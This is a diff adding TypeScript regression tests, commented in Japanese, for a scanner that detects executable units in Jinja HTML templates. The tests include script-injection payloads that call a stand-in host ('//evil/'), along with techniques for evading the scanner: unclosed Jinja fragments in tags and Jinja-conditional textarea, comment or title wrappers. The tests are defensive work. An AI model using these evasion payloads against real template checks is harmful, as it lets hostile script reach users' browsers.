@@ -310,6 +310,69 @@ describe('コメント終端 --!> の解釈', () => {
   });
 });
 
+// ── タグ内 Jinja の読み飛ばし(仕様準拠パーサ化の評価で出た実測の迂回路)──
+// 走査器は「タグ内に Jinja 断片があれば読み飛ばす」が、読み飛ばせないと判断したときに
+// **入力の残り全部を捨てて**いた。単位列は基準と完全一致したまま、その後ろに任意の
+// 実行面を足せる = 不変性ゲートそのものの迂回路である(申請・承認の両入口を通った)。
+// ブラウザは `{` を普通の属性名文字として読み、タグを最初の `>` で閉じて後続を実行する。
+describe('タグ内 Jinja で走査を打ち切らない', () => {
+  const inject = (prefix: string): string =>
+    `<html><body><script>col.width=1</script>${prefix}<script>fetch("//evil/")</script></body></html>`;
+
+  it.each([
+    ['Jinja 開始ですらない `{`', '<div {>'],
+    ['閉じない {{', '<div {{ x >'],
+    ['閉じない {%', '<p {% for >'],
+    ['閉じない {#', '<span {#>'],
+  ])('%s を挟んで足した script を拒否する', (_label, prefix) => {
+    const evil = inject(prefix);
+    expect(collectExecutableUnits(evil)).toContain('script:|fetch("//evil/")');
+    expect(accepted(BASE, evil)).toBe(false);
+  });
+
+  it('遠くの閉じ記号で script を丸ごと 1 断片に飲み込む形も拒否する', () => {
+    // `}}` を文書の後ろへ置けば、その間の実行面が「タグ内 Jinja」として単位から消えていた。
+    const evil = '<div {{ ><script>fetch("//evil/")</script>}}></div>';
+    expect(collectExecutableUnits(evil)).toContain('script:|fetch("//evil/")');
+    expect(accepted('<div></div>', evil)).toBe(false);
+  });
+
+  it('正当なタグ内 Jinja は 1 単位のまま(`>` を含む式でも分割しない)', () => {
+    expect(collectExecutableUnits('<td {% if a > b %}class="x"{% endif %}>a</td>')).toEqual([
+      'jinja-attr:td|{% if a > b %}',
+      'jinja-attr:td|{% endif %}',
+    ]);
+    expect(collectExecutableUnits('<div {{ d["k"] }}>x</div>')).toEqual([
+      'jinja-attr:div|{{ d["k"] }}',
+    ]);
+  });
+});
+
+// ── 仕様準拠パーサ(parse5 等)へ置き換えないことの根拠(回帰ガード)──
+// 検査対象は**描画前の Jinja テンプレ**であって HTML 文書ではない。ゆえに HTML 仕様どおりの
+// 木構築は「別の成果物に対する正しさ」になる: 生の字面では raw text 要素やコメントに
+// 包まれて見えるものが、Jinja 描画後には包みが消えて実行される。実測で parse5 は下の 3 形を
+// すべて単位ゼロにした(= 素通り)のに対し、本走査器の過剰包含は拾う。ここが緑である限り
+// 「木構築するパーサへ置き換える」は退行である。
+describe('描画前テンプレ特有の隠し方(木構築パーサでは消える形)', () => {
+  const inject = (prefix: string, suffix: string): string =>
+    `<html><body><script>col.width=1</script>${prefix}<script>fetch("//evil/")</script>${suffix}</body></html>`;
+
+  it.each([
+    [
+      '条件付き textarea',
+      '{% if false %}<textarea>{% endif %}',
+      '{% if false %}</textarea>{% endif %}',
+    ],
+    ['条件付きコメント', '{% if false %}<!--{% endif %}', '{% if false %}-->{% endif %}'],
+    ['条件付き title', '{% if false %}<title>{% endif %}', '{% if false %}</title>{% endif %}'],
+  ])('%s で包んでも実行面として拾う', (_label, prefix, suffix) => {
+    const evil = inject(prefix, suffix);
+    expect(collectExecutableUnits(evil)).toContain('script:|fetch("//evil/")');
+    expect(accepted(BASE, evil)).toBe(false);
+  });
+});
+
 describe('raw text の終了タグは直後の文字まで見る', () => {
   it('</scriptx> は終了タグではない(末尾のコードが単位へ入る)', () => {
     // JS エンジンは `init() < /scriptx>/ ; evil()` と読むので `evil()` が走る。
